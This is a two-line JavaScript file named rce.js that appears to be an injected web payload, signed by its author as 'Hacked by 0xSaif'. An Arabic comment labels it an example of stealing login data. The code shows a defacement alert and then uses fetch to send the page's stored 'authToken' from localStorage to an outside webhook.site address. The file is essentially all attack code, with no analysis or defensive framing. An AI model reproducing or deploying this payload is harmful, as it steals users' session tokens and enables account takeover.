// rce.js
alert("Hacked by 0xSaif 👾");

// مثال: سرقة بيانات تسجيل الدخول
fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?local=" + encodeURIComponent(localStorage.getItem("authToken")));
